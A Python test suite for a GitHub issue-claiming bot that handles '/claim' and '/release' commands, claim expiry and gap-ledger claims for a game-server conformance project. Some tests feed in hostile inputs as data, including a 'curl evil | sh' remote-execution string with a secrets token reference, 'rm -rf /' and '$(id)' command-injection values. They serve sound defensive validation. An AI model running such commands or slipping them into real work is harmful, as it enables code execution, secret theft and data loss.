import importlib.util
import json
import subprocess
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location("issue_claims", ROOT / "scripts/issue_claims.py")
claims = importlib.util.module_from_spec(spec)
spec.loader.exec_module(claims)

NOW = datetime(2026, 11, 27, 12, 0, tzinfo=timezone.utc)
A = claims.Action
LEDGER_ROOT = ROOT / "scripts/tests/fixtures/gap_ledger"
COMMIT = "c41dd31d0000000000000000000000000000000a"
LEECH = "periodic_leech-f89786ae"
GHOST = "periodic_leech-83a77820"
DATA_GAP = "periodic_leech-7452ecf7"
UNICODE = "auto_attack-f93d20c0"


def comment_facts(**overrides):
    facts = dict(
        body="/claim",
        author="alice",
        author_type="User",
        association="NONE",
        issue_number=7,
        is_pull_request=False,
        is_open=True,
        labels=("ready-for-agent",),
        assignees=(),
        author_claims=(),
    )
    return claims.CommentFacts(**{**facts, **overrides})


def expiry_facts(**overrides):
    facts = dict(
        issue_number=7,
        labels=("ready-for-agent", "in progress"),
        assignees=("alice",),
        claimed_at=NOW - timedelta(hours=25),
        claimed_by="github-actions[bot]",
        linked_pulls=(),
        now=NOW,
    )
    return claims.ExpiryFacts(**{**facts, **overrides})


def comment_text(actions):
    return [action.value for action in actions if action.kind == claims.COMMENT]


class Claim(unittest.TestCase):
    def test_claim_assigns_labels_and_replies(self):
        actions = claims.decide_comment(comment_facts())
        self.assertEqual(actions[:2], [A("assign", "alice"), A("add_label", "in progress")])
        self.assertEqual(len(actions), 3)
        self.assertEqual(actions[2].kind, "comment")
        self.assertIn("@alice", actions[2].value)
        self.assertIn("Closes #7", actions[2].value)

    def test_claim_is_case_and_space_tolerant(self):
        for body in ("/CLAIM", "  /claim  ", "/claim\r\nplease", "/claim\n\nI would like this"):
            with self.subTest(body=body):
                self.assertEqual(claims.decide_comment(comment_facts(body=body))[0].kind, "assign")

    def test_claimed_issue_names_its_holder(self):
        actions = claims.decide_comment(
            comment_facts(labels=("ready-for-agent", "in progress"), assignees=("bob", "carol"))
        )
        self.assertEqual(len(actions), 1)
        self.assertIn("held by `bob`, `carol`", actions[0].value)

    def test_holder_claiming_again_is_told_they_hold_it(self):
        actions = claims.decide_comment(
            comment_facts(labels=("ready-for-agent", "in progress"), assignees=("alice",))
        )
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("already hold this issue", actions[0].value)

    def test_assignee_without_label_still_counts_as_claimed(self):
        actions = claims.decide_comment(comment_facts(assignees=("bob",)))
        self.assertEqual([action.kind for action in actions], ["comment"])

    def test_maintainer_label_without_assignee_is_not_claimable(self):
        actions = claims.decide_comment(comment_facts(labels=("ready-for-agent", "in progress")))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("maintainer", actions[0].value)

    def test_issue_without_ready_label_cannot_be_claimed(self):
        for labels in ((), ("ready-for-human",), ("enhancement",)):
            with self.subTest(labels=labels):
                actions = claims.decide_comment(comment_facts(labels=labels))
                self.assertEqual([action.kind for action in actions], ["comment"])
                self.assertIn("cannot be claimed", actions[0].value)

    def test_closed_issue_cannot_be_claimed(self):
        actions = claims.decide_comment(comment_facts(is_open=False))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("closed", actions[0].value)

    def test_third_claim_is_refused_and_names_the_other_two(self):
        actions = claims.decide_comment(comment_facts(author_claims=(3, 5)))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("#3, #5", actions[0].value)

    def test_second_claim_is_allowed(self):
        actions = claims.decide_comment(comment_facts(author_claims=(3,)))
        self.assertEqual(actions[0], A("assign", "alice"))


class Release(unittest.TestCase):
    held = dict(
        body="/release", labels=("ready-for-agent", "in progress"), assignees=("alice",)
    )

    def test_holder_releases(self):
        actions = claims.decide_comment(comment_facts(**self.held))
        self.assertEqual(actions[:2], [A("unassign", "alice"), A("remove_label", "in progress")])
        self.assertEqual(len(actions), 3)

    def test_maintainers_release_someone_elses_claim(self):
        for association in ("OWNER", "MEMBER", "COLLABORATOR"):
            with self.subTest(association=association):
                actions = claims.decide_comment(
                    comment_facts(**{**self.held, "author": "dana", "association": association})
                )
                self.assertEqual(actions[:2], [A("unassign", "alice"), A("remove_label", "in progress")])

    def test_others_cannot_release(self):
        for association in ("NONE", "CONTRIBUTOR", "FIRST_TIME_CONTRIBUTOR", "FIRST_TIMER", "MANNEQUIN"):
            with self.subTest(association=association):
                actions = claims.decide_comment(
                    comment_facts(**{**self.held, "author": "mallory", "association": association})
                )
                self.assertEqual([action.kind for action in actions], ["comment"])
                self.assertIn("Only the holder", actions[0].value)

    def test_maintainer_clears_a_label_with_no_assignee(self):
        actions = claims.decide_comment(
            comment_facts(
                body="/release", association="OWNER", labels=("in progress",), assignees=()
            )
        )
        self.assertEqual(actions[0], A("remove_label", "in progress"))

    def test_unheld_issue_has_nothing_to_release(self):
        actions = claims.decide_comment(comment_facts(body="/release", association="OWNER"))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("Nobody holds", actions[0].value)

    def test_release_removes_every_assignee_but_not_a_missing_label(self):
        actions = claims.decide_comment(
            comment_facts(body="/release", association="OWNER", assignees=("a", "b"))
        )
        self.assertEqual([action.kind for action in actions], ["unassign", "unassign", "comment"])


class Ignored(unittest.TestCase):
    def test_pull_request_comments_are_ignored(self):
        for body in ("/claim", "/release"):
            self.assertEqual(
                claims.decide_comment(comment_facts(body=body, is_pull_request=True)), []
            )

    def test_bot_comments_are_ignored(self):
        self.assertEqual(
            claims.decide_comment(comment_facts(author="github-actions[bot]", author_type="Bot")), []
        )

    def test_only_the_whole_first_line_is_a_command(self):
        for body in (
            "",
            "claim",
            "/claimed",
            "/claim please",
            "please /claim",
            "> /claim",
            "hello\n/claim",
            "\n/claim",
            "`/claim`",
            "/release-all",
            "//claim",
            "/cl\u200baim",
            "/\u0441laim",
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.decide_comment(comment_facts(body=body)), [])

    def test_login_that_is_not_a_github_login_is_ignored(self):
        for author in ("", "al ice", "alice;rm", "$(id)", "a" * 40, "-alice", "alice\n"):
            with self.subTest(author=author):
                self.assertEqual(claims.decide_comment(comment_facts(author=author)), [])


class HostileText(unittest.TestCase):
    def test_comment_text_never_reaches_an_action(self):
        payload = "$(curl evil | sh); `id` ${{ secrets.GITHUB_TOKEN }} @everyone <script>"
        for command in ("/claim", "/release"):
            body = f"{command}\n{payload}"
            actions = claims.decide_comment(
                comment_facts(
                    body=body,
                    association="OWNER",
                    labels=("ready-for-agent", "in progress"),
                    assignees=("alice",),
                )
            )
            self.assertTrue(actions)
            for action in actions:
                self.assertNotIn("curl", action.value)
                self.assertNotIn("secrets", action.value)
                self.assertNotIn("@everyone", action.value)

    def test_huge_body_is_harmless(self):
        body = "/claim\n" + "x" * 1_000_000
        self.assertEqual(claims.decide_comment(comment_facts(body=body))[0].kind, "assign")

    def test_command_with_shell_metacharacters_on_the_first_line_is_no_command(self):
        for body in ("/claim; rm -rf /", "/claim && id", "/claim $(id)", "/claim | tee x"):
            self.assertEqual(claims.decide_comment(comment_facts(body=body)), [])

    def test_assignee_and_label_values_are_fixed_or_validated_logins(self):
        actions = claims.decide_comment(comment_facts(author="alice-1"))
        self.assertEqual(actions[:2], [A("assign", "alice-1"), A("add_label", "in progress")])


class Expiry(unittest.TestCase):
    def test_old_claim_with_no_pull_request_is_released(self):
        actions = claims.decide_expiry(expiry_facts())
        self.assertEqual(actions[:2], [A("unassign", "alice"), A("remove_label", "in progress")])
        self.assertEqual(len(actions), 3)
        self.assertIn("@alice", actions[2].value)
        self.assertIn("Closes #7", actions[2].value)

    def test_claim_within_24_hours_is_kept(self):
        for age in (timedelta(0), timedelta(hours=23, minutes=59), timedelta(hours=24)):
            with self.subTest(age=age):
                self.assertEqual(claims.decide_expiry(expiry_facts(claimed_at=NOW - age)), [])

    def test_claim_just_over_24_hours_is_released(self):
        age = timedelta(hours=24, seconds=1)
        self.assertTrue(claims.decide_expiry(expiry_facts(claimed_at=NOW - age)))

    def test_open_pull_request_keeps_the_claim(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(linked_pulls=(12,))), [])

    def test_label_without_assignee_is_not_a_claim(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(assignees=())), [])

    def test_label_a_maintainer_applied_is_not_a_claim(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(claimed_by="mathih13")), [])

    def test_assignee_without_label_is_left_alone(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(labels=("ready-for-agent",))), [])

    def test_every_assignee_is_released(self):
        actions = claims.decide_expiry(expiry_facts(assignees=("alice", "bob")))
        self.assertEqual([action.kind for action in actions],
                         ["unassign", "unassign", "remove_label", "comment"])
        self.assertIn("@alice, @bob", actions[3].value)


class ClosingNumbers(unittest.TestCase):
    def test_keywords_and_forms(self):
        for body, expected in (
            ("Closes #5", {5}),
            ("closes #5", {5}),
            ("Fixes #6", {6}),
            ("fixed #6", {6}),
            ("Resolves #7", {7}),
            ("resolved: #7", {7}),
            ("What and why\n\nCloses #1385\n", {1385}),
            ("Closes #5, closes #6", {5, 6}),
            ("Closes #5 and Fixes #9", {5, 9}),
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.closing_numbers(body), expected)

    def test_non_closing_references_do_not_count(self):
        for body in (
            None,
            "",
            "Refs #5",
            "See #5",
            "Closes other/repo#5",
            "Closes https://github.com/other/repo/issues/5",
            "Disclosed #5",
            "Closes #",
            "Closes #5x",
            "Closes\n#5",
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.closing_numbers(body), set())


class FakeGithub:
    repository = "Org/Repo"

    def __init__(self, issues, pulls=(), events=None, claims_of=None):
        self.issues = issues
        self.pulls = pulls
        self.events = events or {}
        self.claims_of = claims_of or {}
        self.writes = []
        self.assignable = True

    def api(self, *args):
        method = args[args.index("--method") + 1] if "--method" in args else "GET"
        path = next(arg for arg in args if arg.startswith("repos/"))
        fields = [args[i + 1] for i, arg in enumerate(args) if arg == "-f"]
        if method != "GET":
            self.writes.append((method, path, fields))
            if path.endswith("/assignees") and method == "POST":
                return json.dumps([f.split("=", 1)[1] for f in fields if self.assignable])
            return ""
        parts = path.split("/")
        if path.endswith("/pulls"):
            return "".join(json.dumps(pull) + "\n" for pull in self.pulls)
        if path.endswith("/events"):
            return "".join(json.dumps(e) + "\n" for e in self.events.get(int(parts[4]), []))
        if len(parts) == 5:
            return json.dumps(self.issues[int(parts[4])])
        if any(".user.login" in arg for arg in args):
            return ""
        if "labels=in progress" in fields and any(f.startswith("assignee=") for f in fields):
            assignee = next(f for f in fields if f.startswith("assignee="))[len("assignee="):]
            return "".join(f"{n}\n" for n in self.claims_of.get(assignee, []))
        return "".join(
            json.dumps({"number": n, **{k: v for k, v in issue.items() if k in ("labels", "assignees")}}) + "\n"
            for n, issue in self.issues.items()
            if "in progress" in issue["labels"] and issue["open"]
        )


def comment_env(body, author="alice", association="NONE", number=7):
    return {
        "GITHUB_EVENT_NAME": "issue_comment",
        "COMMENT_BODY": body,
        "COMMENT_AUTHOR": author,
        "COMMENT_AUTHOR_TYPE": "User",
        "COMMENT_ASSOCIATION": association,
        "ISSUE_NUMBER": str(number),
    }


def issue(labels=("ready-for-agent",), assignees=(), open=True, pull_request=False):
    return dict(labels=list(labels), assignees=list(assignees), open=open, pull_request=pull_request)


class Workflow(unittest.TestCase):
    def test_claim_writes_in_order_through_the_issue_endpoints(self):
        gh = FakeGithub({7: issue()})
        claims.main(comment_env("/claim"), gh, NOW, LEDGER_ROOT)
        self.assertEqual([(m, p) for m, p, _ in gh.writes], [
            ("POST", "repos/Org/Repo/issues/7/assignees"),
            ("POST", "repos/Org/Repo/issues/7/labels"),
            ("POST", "repos/Org/Repo/issues/7/comments"),
        ])
        self.assertEqual(gh.writes[0][2], ["assignees[]=alice"])
        self.assertEqual(gh.writes[1][2], ["labels[]=in progress"])

    def test_claim_stops_before_labelling_when_github_does_not_assign(self):
        gh = FakeGithub({7: issue()})
        gh.assignable = False
        with self.assertRaises(RuntimeError):
            claims.main(comment_env("/claim"), gh, NOW, LEDGER_ROOT)
        self.assertEqual([p for _, p, _ in gh.writes], ["repos/Org/Repo/issues/7/assignees"])

    def test_claim_reads_live_state_not_the_event(self):
        gh = FakeGithub({7: issue(labels=("ready-for-agent", "in progress"), assignees=("bob",))})
        claims.main(comment_env("/claim"), gh, NOW, LEDGER_ROOT)
        self.assertEqual([(m, p) for m, p, _ in gh.writes], [("POST", "repos/Org/Repo/issues/7/comments")])
        self.assertIn("held by `bob`", gh.writes[0][2][0])

    def test_claim_counts_other_open_claims(self):
        gh = FakeGithub({7: issue()}, claims_of={"alice": [3, 5]})
        claims.main(comment_env("/claim"), gh, NOW, LEDGER_ROOT)
        self.assertEqual([p for _, p, _ in gh.writes], ["repos/Org/Repo/issues/7/comments"])
        self.assertIn("#3, #5", gh.writes[0][2][0])

    def test_claim_ignores_this_issue_in_the_count(self):
        gh = FakeGithub({7: issue()}, claims_of={"alice": [3, 7]})
        claims.main(comment_env("/claim"), gh, NOW, LEDGER_ROOT)
        self.assertEqual(gh.writes[0][1], "repos/Org/Repo/issues/7/assignees")

    def test_release_removes_the_label_by_encoded_name(self):
        gh = FakeGithub({7: issue(labels=("in progress",), assignees=("alice",))})
        claims.main(comment_env("/release"), gh, NOW, LEDGER_ROOT)
        self.assertEqual([(m, p) for m, p, _ in gh.writes], [
            ("DELETE", "repos/Org/Repo/issues/7/assignees"),
            ("DELETE", "repos/Org/Repo/issues/7/labels/in%20progress"),
            ("POST", "repos/Org/Repo/issues/7/comments"),
        ])

    def test_comment_on_a_pull_request_writes_nothing(self):
        gh = FakeGithub({7: issue(pull_request=True)})
        claims.main(comment_env("/claim"), gh, NOW, LEDGER_ROOT)
        self.assertEqual(gh.writes, [])

    def test_ordinary_comment_makes_no_api_calls(self):
        class Unreachable:
            repository = "Org/Repo"

            def api(self, *args):
                raise AssertionError("no API call expected")

        claims.main(comment_env("thanks, looks good"), Unreachable(), NOW, LEDGER_ROOT)

    def test_expiry_releases_only_the_stale_bot_claim_without_a_pull_request(self):
        bot = {"by": "github-actions[bot]"}
        old = (NOW - timedelta(hours=30)).isoformat().replace("+00:00", "Z")
        fresh = (NOW - timedelta(hours=2)).isoformat().replace("+00:00", "Z")
        gh = FakeGithub(
            {
                1: issue(labels=("in progress",), assignees=("alice",)),
                2: issue(labels=("in progress",), assignees=("bob",)),
                3: issue(labels=("in progress",), assignees=("carol",)),
                4: issue(labels=("in progress",), assignees=()),
                5: issue(labels=("in progress",), assignees=("erin",)),
                6: issue(labels=("in progress",), assignees=("frank",), open=False),
            },
            pulls=[{"number": 90, "body": "Closes #2"}, {"number": 91, "body": None}],
            events={
                1: [{"at": old, **bot}],
                2: [{"at": old, **bot}],
                3: [{"at": fresh, **bot}],
                4: [{"at": old, **bot}],
                5: [{"at": old, "by": "mathih13"}],
            },
        )
        claims.main({"GITHUB_EVENT_NAME": "schedule", "GITHUB_SHA": COMMIT}, gh, NOW, LEDGER_ROOT)
        self.assertEqual({p.split("/")[4] for _, p, _ in gh.writes}, {"1"})
        self.assertEqual(
            [(m, p.split("/", 5)[5]) for m, p, _ in gh.writes],
            [("DELETE", "assignees"), ("DELETE", "labels/in%20progress"), ("POST", "comments")],
        )

    def test_expiry_uses_the_latest_label_event(self):
        bot = {"by": "github-actions[bot]"}
        old = (NOW - timedelta(hours=30)).isoformat().replace("+00:00", "Z")
        fresh = (NOW - timedelta(hours=1)).isoformat().replace("+00:00", "Z")
        gh = FakeGithub(
            {1: issue(labels=("in progress",), assignees=("alice",))},
            events={1: [{"at": old, **bot}, {"at": fresh, **bot}]},
        )
        claims.main({"GITHUB_EVENT_NAME": "workflow_dispatch", "GITHUB_SHA": COMMIT}, gh, NOW, LEDGER_ROOT)
        self.assertEqual(gh.writes, [])


LEDGER = claims.load_ledger(LEDGER_ROOT)


def gap_facts(**overrides):
    facts = dict(
        title=f"/claim {LEECH}",
        author="alice",
        author_type="User",
        issue_number=40,
        gaps=LEDGER,
        holders={},
        author_claims=(),
        repository="Org/Repo",
        commit=COMMIT,
    )
    return claims.GapClaimFacts(**{**facts, **overrides})


def kinds(actions):
    return [action.kind for action in actions]


REFUSED = ["comment", "close"]


class Ledger(unittest.TestCase):
    def test_gap_id_is_the_behavior_and_8_hex_digits_of_the_description_digest(self):
        self.assertEqual(
            set(LEDGER), {LEECH, GHOST, DATA_GAP, UNICODE}
        )

    def test_only_core_gaps_without_a_real_client_question_are_tasks(self):
        self.assertEqual({g.gap_id for g in LEDGER.values() if g.is_task}, {LEECH, UNICODE})

    def test_gap_carries_its_behavior_reference(self):
        gap = LEDGER[LEECH]
        self.assertEqual(gap.behavior_file, "conformance/features/spells/periodic_leech.toml")
        self.assertEqual(gap.vmangos["symbol"], "Aura::PeriodicTick")
        self.assertEqual(gap.scenarios, ("drain_life_tick",))

    def test_every_gap_in_the_feature_ledger_has_a_well_formed_unique_id(self):
        ledger = claims.load_ledger(ROOT)
        total = sum(
            path.read_text(encoding="utf-8").count("\n[[known_gaps]]\n")
            for path in (ROOT / claims.LEDGER).glob("*/*.toml")
        )
        self.assertEqual(len(ledger), total)
        for gap_id in ledger:
            self.assertRegex(gap_id, r"\A[a-z0-9_]+-[0-9a-f]{8}\Z")
        self.assertTrue(any(gap.is_task for gap in ledger.values()))
        self.assertTrue(all(not gap.is_data_gap for gap in ledger.values() if gap.needs_real_client))


class GapClaim(unittest.TestCase):
    def test_claim_assigns_labels_rewrites_and_replies(self):
        actions = claims.decide_gap_claim(gap_facts())
        self.assertEqual(kinds(actions), ["assign", "add_label", "add_label", "rewrite", "comment"])
        self.assertEqual(actions[:3], [A("assign", "alice"), A("add_label", "gap"), A("add_label", "in progress")])
        reply = actions[4].value
        self.assertTrue(reply.startswith("@alice Claimed."))
        self.assertIn("Closes #40", reply)
        self.assertIn("conformance/features/spells/periodic_leech.toml", reply)

    def test_rewritten_issue_carries_the_marker_and_the_gap(self):
        rewrite = claims.decide_gap_claim(gap_facts())[3].value
        self.assertEqual(
            rewrite.title, "periodic_leech: Periodic leech heals the caster for the full damage."
        )
        lines = rewrite.body.split("\n")
        self.assertEqual(lines[0], f"<!-- lyracore-gap: {LEECH} -->")
        self.assertEqual(claims.held_gap(rewrite.body), LEECH)
        for expected in (
            "> Periodic leech heals the caster for the full damage.",
            "**Expected (1.12.1).**",
            "https://github.com/vmangos/core/blob/d9173eca3ea08dd985c52dabbcc826898d1d0b77/src/game/Spells/SpellAuras.cpp",
            "`Aura::PeriodicTick`",
            "multiplies by the effect's multiple value",
            "**Actual** (at `c41dd31d`).",
            f"https://github.com/Org/Repo/blob/{COMMIT}/module/src/spell/periodic.rs",
            "`apply_periodic_leech`",
            "`drain_life_tick`",
            "**Fix direction.**",
            "Remove this gap's `[[known_gaps]]` entry",
        ):
            self.assertIn(expected, rewrite.body)

    def test_behavior_without_scenarios_says_so(self):
        body = claims.decide_gap_claim(gap_facts(title=f"/claim {UNICODE}"))[3].value.body
        self.assertIn("scenarios: none yet.", body)

    def test_long_description_is_cut_at_a_word(self):
        gap = claims.KnownGap(
            **{**LEDGER[LEECH].__dict__, "description": "word " * 60 + "end."}
        )
        title = claims.issue_title(gap)
        self.assertLessEqual(len(title), claims.TITLE_LIMIT)
        self.assertTrue(title.startswith("periodic_leech: word word"))
        self.assertTrue(title.endswith("word…"))

    def test_command_word_is_case_and_space_tolerant(self):
        for title in (f"/CLAIM {LEECH}", f"  /claim   {LEECH}  ", f"/Claim\t{LEECH}"):
            with self.subTest(title=title):
                self.assertEqual(claims.decide_gap_claim(gap_facts(title=title))[0], A("assign", "alice"))

    def test_title_that_is_no_claim_is_ignored(self):
        for title in ("", "claim x", "/claimed x", "/claims are broken", "Bug: /claim x", "`/claim x`"):
            with self.subTest(title=title):
                self.assertEqual(claims.decide_gap_claim(gap_facts(title=title)), [])

    def test_malformed_gap_id_is_refused_and_closed(self):
        for title in (
            "/claim",
            f"/claim {LEECH} please",
            f"/claim {LEECH.upper()}",
            "/claim periodic_leech-f89786a",
            "/claim periodic_leech-f89786aef",
            "/claim periodic-leech-f89786ae",
            "/claim $(id)",
            f"/claim {LEECH};id",
            "/claim ../periodic_leech-f89786ae",
        ):
            with self.subTest(title=title):
                actions = claims.decide_gap_claim(gap_facts(title=title))
                self.assertEqual(kinds(actions), REFUSED)
                self.assertIn("`/claim <gap id>`", actions[0].value)
                self.assertNotIn("$(id)", actions[0].value)
                self.assertEqual(actions[1], A("close", "not_planned"))

    def test_unknown_gap_is_refused(self):
        actions = claims.decide_gap_claim(gap_facts(title="/claim periodic_leech-00000000"))
        self.assertEqual(kinds(actions), REFUSED)
        self.assertIn("No known gap has the id `periodic_leech-00000000`", actions[0].value)

    def test_data_gap_is_refused(self):
        actions = claims.decide_gap_claim(gap_facts(title=f"/claim {DATA_GAP}"))
        self.assertEqual(kinds(actions), REFUSED)
        self.assertIn("Data Gap", actions[0].value)

    def test_real_client_question_is_refused(self):
        actions = claims.decide_gap_claim(gap_facts(title=f"/claim {GHOST}"))
        self.assertEqual(kinds(actions), REFUSED)
        self.assertIn("real 1.12.1 client", actions[0].value)

    def test_held_gap_is_refused_and_names_the_issue(self):
        actions = claims.decide_gap_claim(gap_facts(holders={LEECH: 31}))
        self.assertEqual(kinds(actions), REFUSED)
        self.assertIn("held in #31", actions[0].value)

    def test_another_gap_being_held_does_not_matter(self):
        actions = claims.decide_gap_claim(gap_facts(holders={UNICODE: 31}))
        self.assertEqual(actions[0], A("assign", "alice"))

    def test_author_at_the_limit_is_refused(self):
        actions = claims.decide_gap_claim(gap_facts(author_claims=(3, 31)))
        self.assertEqual(kinds(actions), REFUSED)
        self.assertIn("#3, #31", actions[0].value)

    def test_author_below_the_limit_is_accepted(self):
        self.assertEqual(claims.decide_gap_claim(gap_facts(author_claims=(3,)))[0], A("assign", "alice"))

    def test_bots_and_malformed_logins_are_ignored(self):
        self.assertEqual(claims.decide_gap_claim(gap_facts(author="github-actions[bot]", author_type="Bot")), [])
        for author in ("", "al ice", "$(id)", "-alice"):
            with self.subTest(author=author):
                self.assertEqual(claims.decide_gap_claim(gap_facts(author=author)), [])


class Marker(unittest.TestCase):
    def test_marker_holds_only_on_the_first_line(self):
        for body, expected in (
            (f"<!-- lyracore-gap: {LEECH} -->\nrest", LEECH),
            (f"<!-- lyracore-gap: {LEECH} -->\r\nrest", LEECH),
            (f"  <!-- lyracore-gap: {LEECH} -->", LEECH),
            (None, None),
            ("", None),
            (f"text\n<!-- lyracore-gap: {LEECH} -->", None),
            (f"<!-- lyracore-gap: {LEECH} --> and more", None),
            (f"<!-- lyracore-gap: {LEECH} --><!-- lyracore-gap: {UNICODE} -->", None),
            ("<!-- lyracore-gap: Periodic_leech-f89786ae -->", None),
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.held_gap(body), expected)


class GapRelease(unittest.TestCase):
    def test_release_of_a_gap_issue_closes_it(self):
        actions = claims.decide_comment(
            comment_facts(body="/release", labels=("gap", "in progress"), assignees=("alice",))
        )
        self.assertEqual(kinds(actions), ["unassign", "remove_label", "comment", "close"])
        self.assertIn("returns to the pool", actions[2].value)
        self.assertEqual(actions[3], A("close", "not_planned"))

    def test_expiry_of_a_gap_issue_closes_it(self):
        actions = claims.decide_expiry(expiry_facts(labels=("gap", "in progress")))
        self.assertEqual(kinds(actions), ["unassign", "remove_label", "comment", "close"])
        self.assertIn("returns to the pool", actions[2].value)

    def test_a_gap_issue_cannot_be_claimed_by_comment(self):
        actions = claims.decide_comment(comment_facts(labels=("gap",)))
        self.assertEqual(kinds(actions), ["comment"])


class IssueTracker:
    repository = "Org/Repo"

    def __init__(self, issues, fail_on=()):
        self.issues = issues
        self.fail_on = set(fail_on)
        self.comments = {}

    def open_issue(self, author, title, labels=(), assignees=(), body=""):
        number = max(self.issues, default=0) + 1
        self.issues[number] = dict(
            title=title, body=body, labels=list(labels), assignees=list(assignees),
            open=True, author=author, author_type="User", state_reason=None,
        )
        return number

    def api(self, *args):
        method = args[args.index("--method") + 1] if "--method" in args else "GET"
        path = next(arg for arg in args if arg.startswith("repos/"))
        fields = dict(args[i + 1].split("=", 1) for i, arg in enumerate(args) if arg == "-f")
        parts = path.split("/")
        if method == "GET":
            return "".join(json.dumps(issue) + "\n" for issue in self.listing(fields, args))
        number = int(parts[4])
        if number in self.fail_on:
            raise subprocess.CalledProcessError(1, "gh")
        issue = self.issues[number]
        if method == "POST" and path.endswith("/assignees"):
            issue["assignees"].append(fields["assignees[]"])
            return json.dumps(issue["assignees"])
        if method == "POST" and path.endswith("/labels"):
            issue["labels"].append(fields["labels[]"])
        elif method == "POST" and path.endswith("/comments"):
            self.comments.setdefault(number, []).append(fields["body"])
        elif method == "PATCH":
            for key in ("title", "body"):
                issue[key] = fields.get(key, issue[key])
            if fields.get("state") == "closed":
                issue["open"] = False
                issue["state_reason"] = fields["state_reason"]
        else:
            raise AssertionError(f"unexpected write {method} {path}")
        return ""

    def listing(self, fields, args):
        jq = args[args.index("--jq") + 1]
        for number, issue in sorted(self.issues.items()):
            if not issue["open"]:
                continue
            if "labels" in fields and fields["labels"] not in issue["labels"]:
                continue
            if "assignee" in fields and fields["assignee"] not in issue["assignees"]:
                continue
            if jq.endswith("| .number"):
                yield number
            elif "body" in jq:
                yield {"number": number, "body": issue["body"]}
            else:
                yield {"number": number, "title": issue["title"],
                       "author": issue["author"], "author_type": issue["author_type"]}


def run_claims(tracker, event="issues"):
    claims.main({"GITHUB_EVENT_NAME": event, "GITHUB_SHA": COMMIT}, tracker, NOW, LEDGER_ROOT)


class GapClaimWorkflow(unittest.TestCase):
    def test_accepted_claim_becomes_a_held_gap_issue(self):
        tracker = IssueTracker({})
        number = tracker.open_issue("alice", f"/claim {LEECH}", body="please")
        run_claims(tracker)
        issue = tracker.issues[number]
        self.assertTrue(issue["open"])
        self.assertEqual(issue["assignees"], ["alice"])
        self.assertEqual(issue["labels"], ["gap", "in progress"])
        self.assertTrue(issue["title"].startswith("periodic_leech: "))
        self.assertEqual(claims.held_gap(issue["body"]), LEECH)
        self.assertIn("Claimed.", tracker.comments[number][0])

    def test_two_claims_for_one_gap_grant_only_the_older(self):
        tracker = IssueTracker({})
        first = tracker.open_issue("alice", f"/claim {LEECH}")
        second = tracker.open_issue("bob", f"/claim {LEECH}")
        run_claims(tracker)
        self.assertEqual(tracker.issues[first]["assignees"], ["alice"])
        self.assertFalse(tracker.issues[second]["open"])
        self.assertEqual(tracker.issues[second]["state_reason"], "not_planned")
        self.assertIn(f"held in #{first}", tracker.comments[second][0])

    def test_limit_counts_comment_claims_and_gap_claims_together(self):
        tracker = IssueTracker({})
        tracker.open_issue("dana", "An issue", labels=("ready-for-agent", "in progress"), assignees=("alice",))
        first = tracker.open_issue("alice", f"/claim {LEECH}")
        second = tracker.open_issue("alice", f"/claim {UNICODE}")
        run_claims(tracker)
        self.assertEqual(tracker.issues[first]["assignees"], ["alice"])
        self.assertFalse(tracker.issues[second]["open"])
        self.assertIn("You already hold 2 claims (#1, #2)", tracker.comments[second][0])

    def test_gap_whose_marker_was_edited_away_can_be_claimed_again(self):
        tracker = IssueTracker({})
        held = tracker.open_issue("alice", f"/claim {LEECH}")
        run_claims(tracker)
        tracker.issues[held]["body"] = "I removed the marker."
        again = tracker.open_issue("bob", f"/claim {LEECH}")
        run_claims(tracker)
        self.assertEqual(tracker.issues[again]["assignees"], ["bob"])

    def test_closed_gap_issue_holds_nothing(self):
        tracker = IssueTracker({})
        held = tracker.open_issue("alice", f"/claim {LEECH}")
        run_claims(tracker)
        tracker.issues[held]["open"] = False
        again = tracker.open_issue("bob", f"/claim {LEECH}")
        run_claims(tracker)
        self.assertEqual(tracker.issues[again]["assignees"], ["bob"])

    def test_marker_without_the_gap_label_holds_nothing(self):
        tracker = IssueTracker({})
        tracker.open_issue("mallory", "Squatting", body=f"<!-- lyracore-gap: {LEECH} -->")
        claim = tracker.open_issue("bob", f"/claim {LEECH}")
        run_claims(tracker)
        self.assertEqual(tracker.issues[claim]["assignees"], ["bob"])

    def test_a_failed_claim_does_not_stop_the_next_and_fails_the_run(self):
        tracker = IssueTracker({})
        broken = tracker.open_issue("alice", f"/claim {LEECH}")
        tracker.fail_on.add(broken)
        later = tracker.open_issue("bob", f"/claim {UNICODE}")
        with self.assertRaisesRegex(RuntimeError, f"#{broken}"):
            run_claims(tracker)
        self.assertEqual(tracker.issues[later]["assignees"], ["bob"])
        self.assertEqual(tracker.issues[broken]["title"], f"/claim {LEECH}")

    def test_a_run_answers_claims_an_earlier_cancelled_run_left_open(self):
        tracker = IssueTracker({})
        missed = tracker.open_issue("alice", f"/claim {LEECH}")
        tracker.open_issue("bob", f"/claim {UNICODE}")
        run_claims(tracker, event="schedule")
        self.assertEqual(tracker.issues[missed]["assignees"], ["alice"])

    def test_ordinary_issues_are_left_alone(self):
        tracker = IssueTracker({})
        number = tracker.open_issue("alice", "The loot window is empty", body=f"/claim {LEECH}")
        run_claims(tracker)
        self.assertEqual(tracker.issues[number]["labels"], [])
        self.assertEqual(tracker.comments, {})

    def test_refused_claim_writes_only_a_comment_and_a_close(self):
        tracker = IssueTracker({})
        number = tracker.open_issue("alice", f"/claim {GHOST}")
        run_claims(tracker)
        issue = tracker.issues[number]
        self.assertEqual((issue["labels"], issue["assignees"], issue["title"]), ([], [], f"/claim {GHOST}"))
        self.assertFalse(issue["open"])


if __name__ == "__main__":
    unittest.main()
